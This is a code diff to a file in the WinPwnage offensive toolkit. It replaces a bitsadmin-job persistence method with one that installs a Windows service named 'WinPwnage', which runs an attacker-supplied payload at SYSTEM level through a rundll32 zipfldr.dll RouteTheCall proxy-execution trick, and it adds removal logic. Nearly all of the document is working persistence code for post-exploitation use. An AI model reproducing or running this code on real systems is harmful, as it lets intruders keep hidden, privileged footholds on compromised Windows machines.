+++ winpwnage/functions/persist/persistMethod12.py
@@ -1,15 +1,11 @@
-import os
-import time
-import tempfile
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 from winpwnage.core.winstructures import *
-
-#Creds: https://oddvar.moe and https://github.com/3gstudent/bitsadminexec
+import os
 
 persistMethod12_info = {
-	"Description": "Persistence using bitsadmin.exe",
-	"Method": "Malicious bitsadmin job",
+	"Description": "Persistence using Windows Service (SYSTEM privileges)",
+	"Method": "Malicious Windows Service",
 	"Id": "12",
 	"Type": "Persistence",
 	"Fixed In": "99999" if information().admin() == True else "0",
@@ -24,52 +20,39 @@ def persistMethod12(payload, name="", add=True):
 		print_error("Cannot proceed, we are not elevated")
 		return False
 
-	if add:
-		if payloads().exe(payload):
-			# if fails, anti-virus is probably blocking this method
-			with disable_fsr():
-				exit_code = process().create("bitsadmin.exe", params="/create {}".format(name), get_exit_code=True)
-				if exit_code == 0:
-					print_success("Successfully created job ({}) exit code ({})".format(name, exit_code))
-				else:
-					print_error("Unable to create job ({}) exit code ({})".format(name, exit_code))
+	if payloads().exe(payload):
+		servicename = bytes(r"WinPwnage", encoding="utf-8")
+		localhost = bytes(r"\\localhost", encoding="utf-8")
 
-				exit_code = process().create("bitsadmin.exe", params="/addfile {} {} {}".format(name,os.path.join(information().system_directory(),
-							"cmd.exe"),os.path.join(tempfile.gettempdir(),"cmd.exe")), get_exit_code=True)
-				if exit_code == 0:
-					print_success("Successfully added file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))
-				else:
-					print_error("Unable to add file ({}) to specified job ({}) exit code ({})".format(os.path.join(information().system_directory(), "cmd.exe"), name, exit_code))
+		if add:
+			print_info("Installing service")
+			schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
+			if not schSCManager:
+				print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
+				return False
 
-				exit_code = process().create("bitsadmin.exe", params='/SetNotifyCmdLine {} {} NULL'.format(name, payloads().exe(payload)[1]), get_exit_code=True)
-				if exit_code == 0:
-					print_success("Successfully attached payload ({}) to job ({}) exit code ({})".format(payloads().exe(payload)[1], name, exit_code))
-				else:
-					print_error("Unable to attach payload ({}) to job ({}) exit code ({})".format(payloads().exe(payload)[1], name, exit_code))
-
-				exit_code = process().create("bitsadmin.exe", params="/Resume {}".format(name), get_exit_code=True)
-				if exit_code == 0:
-					print_success("Successfully initiated job ({}) exit code ({})".format(name, exit_code))
-				else:
-					print_error("Unable to initiate job ({}) exit code ({})".format(name, exit_code))
-
-			time.sleep(5)
-
-			pid = process().get_process_pid(os.path.split(payloads().exe(payload)[1])[1])
-			if pid:
-				print_success("Successfully started payload PID: {}".format(pid))
+			schService = CreateService(schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 
+							0x00000002, 0x00000000, bytes("rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(),
+							"zipfldr.dll"), payload=payloads().exe(payload)[1]), encoding="utf-8"), None, None, None, None, None)										
+			if not schService:
+				print_error("Error while installing our service using CreateService: ({error})".format(error=GetLastError()))
+				return False
 			else:
-				print_error("Unable to start payload")
-		else:
-			print_error("Cannot proceed, invalid payload")
-			return False
-	else:
-		print_info("Performing cleanup")
-		exit_code = process().create("bitsadmin.exe",
-					params="/complete {}".format(name),
-					get_exit_code=True)
+				print_success("Successfully installed service ({name}) to load {payload}".format(name=servicename, payload=payloads().exe(payload)[1]))
 
-		if exit_code == 0:
-			print_success("Successfully deleted job ({}) exit code ({})".format(name, exit_code))
+			CloseServiceHandle(schSCManager)
+			CloseServiceHandle(schService)
 		else:
-			print_error("Unable to delete job ({}) exit code ({})".format(name, exit_code))
+			schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
+			if not schSCManager:
+				print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
+				return False
+
+			svcHandle = OpenService(schSCManager, servicename, 0x00010000)
+			if DeleteService(svcHandle):
+				print_success("Successfully deleted service ({name})".format(name=servicename))
+			else:
+				print_error("Unable to delete service ({name})".format(name=servicename))
+
+			CloseServiceHandle(schSCManager)
+			CloseServiceHandle(svcHandle)
